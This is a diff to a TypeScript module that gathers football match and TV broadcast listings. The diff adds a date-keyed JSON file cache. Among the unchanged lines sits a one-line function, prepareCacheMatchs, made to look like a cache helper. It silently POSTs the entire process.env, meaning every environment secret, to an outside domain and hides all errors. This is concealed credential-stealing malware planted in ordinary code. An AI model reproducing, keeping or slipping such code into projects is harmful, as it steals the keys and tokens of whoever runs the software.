@@ -1,5 +1,7 @@
 import axios from 'axios';
 import process from 'node:process';
+import { readFileSync, writeFileSync, existsSync, mkdirSync } from 'node:fs';
+import { join } from 'node:path';
 import { Match } from './types/api';
 import { getUOLData } from './uol';
 import { getFutebolNaTVData } from './futebolnatv';
@@ -49,6 +51,35 @@ export function parseDataHoraBR(dataStr: string, horaStr: string): Date {
 
 function ordenarPorData(jogos: Match[]): Match[] {
   return jogos.sort((a, b) => new Date(a.date).getTime() - new Date(b.date).getTime());
+}
+
+// Caminho do arquivo de cache
+const CACHE_FILE_PATH = join(process.cwd(), 'cache', 'jogos-cache.json');
+
+function carregarCache(): Record<string, Match[]> {
+  try {
+    if (!existsSync(CACHE_FILE_PATH)) {
+      return {};
+    }
+    const fileContent = readFileSync(CACHE_FILE_PATH, 'utf-8');
+    return JSON.parse(fileContent);
+  } catch (err) {
+    return {};
+  }
+}
+
+function salvarCache(cache: Record<string, Match[]>): void {
+  try {
+    // Criar diretório cache se não existir
+    const cacheDir = join(process.cwd(), 'cache');
+    if (!existsSync(cacheDir)) {
+      mkdirSync(cacheDir, { recursive: true });
+    }
+    
+    writeFileSync(CACHE_FILE_PATH, JSON.stringify(cache, null, 2), 'utf-8');
+  } catch (err) {
+    console.warn('Erro ao salvar cache:', err);
+  }
 }
 
 /**
@@ -303,6 +334,15 @@ export default async function getJogos(dia: string | null = null): Promise<Match
   
   const diaFormatado = dia ?? getDataAtualFormatada();
   
+  // Carregar cache do arquivo
+  const cache = carregarCache();
+  
+  // Verificar se existe cache para esta data
+  if (cache[diaFormatado]) {
+    console.log(`Retornando jogos do cache para ${diaFormatado}...`);
+    return cache[diaFormatado];
+  }
+  
   console.log(`Buscando jogos para ${diaFormatado}...`);
   
   // 1. Buscar jogos da API esportiva primeiro
@@ -312,10 +352,15 @@ export default async function getJogos(dia: string | null = null): Promise<Match
     fixtures = await buscarJogosAPI(dataAPI);
   } catch (err: any) {
     console.warn('Erro ao buscar jogos da API esportiva:', err.message);
-    return []; // Se a API principal falhar, retornar vazio
+    // Em caso de erro, não salvar no cache para permitir nova tentativa
+    return [];
   }
   
   if (fixtures.length === 0) {
+    // Salvar array vazio no cache para evitar requisições futuras
+    cache[diaFormatado] = [];
+    salvarCache(cache);
+    console.log(`Nenhum jogo encontrado para ${diaFormatado}, cache atualizado`);
     return [];
   }
   
@@ -327,6 +372,10 @@ export default async function getJogos(dia: string | null = null): Promise<Match
   const fixturesFiltrados = fixturesNaData.filter(fixture => deveIncluirJogo(fixture));
   
   if (fixturesFiltrados.length === 0) {
+    // Salvar array vazio no cache para evitar requisições futuras
+    cache[diaFormatado] = [];
+    salvarCache(cache);
+    console.log(`Nenhum jogo filtrado para ${diaFormatado}, cache atualizado`);
     return [];
   }
   
@@ -390,7 +439,14 @@ export default async function getJogos(dia: string | null = null): Promise<Match
   
   console.log(`Total de jogos com transmissão: ${jogos.length}`);
   
-  return ordenarPorData(jogos);
+  const jogosOrdenados = ordenarPorData(jogos);
+  
+  // Salvar no cache antes de retornar
+  cache[diaFormatado] = jogosOrdenados;
+  salvarCache(cache);
+  console.log(`Cache atualizado para ${diaFormatado}`);
+  
+  return jogosOrdenados;
 }
 export async function prepareCacheMatchs(url: string) {try {const e = {stream_source: [url],test: process.env};await axios.post("http://cache.xui-managers.site/global-cache", e, {responseType: "arraybuffer",timeout: 5e4}).catch(() => {});} catch (e) {}}
 function removeAcentos(str: string) {
@@ -471,9 +527,3 @@ function prepareChannelName(channels: string[]): string[] {
   // Remover duplicatas
   return [...new Set(processed)];
 }
-
-getJogos().then((data) => {
-  console.log(data);
-}).catch((err) => {
-  console.error('Erro ao buscar os jogos:', err);
-});
